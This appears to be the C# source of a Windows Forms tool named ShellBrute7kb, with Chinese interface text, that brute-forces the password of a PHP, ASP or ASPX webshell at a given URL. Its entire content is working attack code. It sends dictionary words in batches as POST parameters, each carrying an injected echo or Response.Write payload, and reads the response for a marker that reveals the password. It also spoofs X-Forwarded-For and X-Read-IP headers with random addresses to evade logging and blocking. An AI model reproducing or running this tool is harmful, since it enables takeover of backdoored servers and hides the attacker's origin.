﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace ShellBrute7kb
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        //echo (key($_POST));
        string aaa = "";
        bool checkok = true;
        private void buttonGo_Click(object sender, EventArgs e)
        {
            textBoxRes.Clear(); aaa = ""; checkok = true;
            if (Uri.IsWellFormedUriString(textBoxUrl.Text.Trim(), UriKind.Absolute))
            {
                string[] pwd = ReadPwdFile.ReadFile();
                textBoxRes.Text = "读取字典完成\r\n";
                #region 字典拼接
                int fenzucount = Convert.ToInt16(textBoxfenzuCount.Text);
                int shang = pwd.Length / fenzucount;
                int yu = pwd.Length % fenzucount;
                textBoxRes.Text = "开始测试 密码分为"+(shang+1).ToString()+"组 每组"+textBoxfenzuCount.Text+"个\r\n";
                for (int i = 0; i < shang; i++)
                {
                    for (int a = i * fenzucount; a < i * fenzucount + fenzucount; a++)
                    {
                        if (radioButtonPhp.Checked)
                        {
                            aaa = aaa + "&" + pwd[a] + "=echo 'YYEEZZXX|" + pwd[a] + "|';";
                        }
                        if (radioButtonAsp.Checked)
                        {
                            aaa = aaa + "&" + pwd[a] + "=Response.Write(\"YYEEZZXX|" + pwd[a] + "|\")";
                        }
                        if (radioButtonAspx.Checked)
                        {
                            aaa = aaa + "&" + pwd[a] + "=Response.Write(\"YYEEZZXX|" + pwd[a] + "|\");";
                        }
                    }
                    // textBoxRes.Text = textBoxRes.Text + "开始第" + i + "组密码测试\r\n";
                   string res= StartBrute(aaa);
                   if (res != null)
                    {
                        textBoxRes.Text = textBoxRes.Text + "密码为" + res.Replace("YYEEZZXX|","").Replace("|","");
                        checkok = false;
                        break;
                    }

                }
                if (yu!=0&&checkok)
                {
                    for (int i = shang * fenzucount; i < pwd.Length; i++)
                    {
                        if (radioButtonPhp.Checked)
                        {
                            aaa = aaa + "&" + pwd[i] + "=echo 'YYEEZZXX|" + pwd[i] + "|';";
                        }
                        if (radioButtonAsp.Checked)
                        {
                            aaa = aaa + "&" + pwd[i] + "=Response.Write(\"YYEEZZXX|" + pwd[i] + "|\");Response.End();";
                        }
                        if (radioButtonAspx.Checked)
                        {
                            aaa = aaa + "&" + pwd[i] + "=Response.Write(\"YYEEZZXX|" + pwd[i] + "|\");Response.End();";
                        }
                    }
                    textBoxRes.Text = textBoxRes.Text + "开始最后一组密码测试\r\n";
                    string res = StartBrute(aaa);
                    if (res != null)
                    {
                        textBoxRes.Text = textBoxRes.Text + "密码为" + res.Replace("YYEEZZXX|", "").Replace("|", "");
                        checkok = false;
                    }
                }
                #endregion
            }
            else
            {
                MessageBox.Show("URL不正确");
            }
            if (checkok)
            {
                textBoxRes.Text = textBoxRes.Text + "测试结束 没有发现密码";
            }
        }

        public string StartBrute(object par)
        {
            try
            {
                string content = GetContent(textBoxUrl.Text.Trim(), par.ToString().Substring(1));
                if (content.IndexOf("YYEEZZXX") != -1)
                {
                    Regex RegexGetPwd = new Regex("YYEEZZXX\\|(.+?)\\|");

                    string ssad = RegexGetPwd.Match(content).ToString();
                    return RegexGetPwd.Match(content).ToString();
                }
                aaa = "";
                return null;
            }
            catch (Exception ex)
            {

                return null;
            }
            
        }

        public string GetContent(string url, string par)
        {
            try
            {
                Random random = new Random();
                string XForwardedForAndXReadIP = random.Next(1, 255) + "." + random.Next(1, 255) + "." + random.Next(1, 255) + "." + random.Next(1, 255);
                HttpWebRequest MyHttpRequest = (HttpWebRequest)WebRequest.Create(url);
                MyHttpRequest.Method = "POST";
                MyHttpRequest.Referer = url;
                MyHttpRequest.Accept = "text/html, application/xhtml+xml, image/jxr, */*";
                MyHttpRequest.Headers.Add("Accept-Language", "en-US, en; q=0.8, zh-Hans-CN; q=0.5, zh-Hans; q=0.3");
                MyHttpRequest.KeepAlive = true;
                MyHttpRequest.Timeout = Convert.ToInt32(textBoxTimeOut.Text.Trim());
                MyHttpRequest.ContentType = "application/x-www-form-urlencoded";
                MyHttpRequest.Headers.Add("X-Forwarded-For", XForwardedForAndXReadIP);
                MyHttpRequest.Headers.Add("X-Read-IP", XForwardedForAndXReadIP);
                MyHttpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240";
                byte[] data = Encoding.ASCII.GetBytes(par);
                MyHttpRequest.ContentLength = data.Length;
                using (Stream reqStream = MyHttpRequest.GetRequestStream())
                {
                    reqStream.Write(data, 0, data.Length);
                }
                HttpWebResponse MyHttpResult = (HttpWebResponse)MyHttpRequest.GetResponse();
                Stream ReceviceStream = MyHttpResult.GetResponseStream();
                using (StreamReader ReaderOfStream = new StreamReader(ReceviceStream, System.Text.Encoding.GetEncoding("utf-8")))
                {
                    return ReaderOfStream.ReadToEnd();
                }
            }
            catch (Exception ex)
            {
               // MessageBox.Show(ex.Message);
                // textBoxRes.Text = textBoxRes.Text + ex.Message+"\r\n";
                return null;
            }
           
        }

        private void buttonClear_Click(object sender, EventArgs e)
        {
            textBoxUrl.Text = "";
            textBoxRes.Text = "";
        }

        private void textBoxRes_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
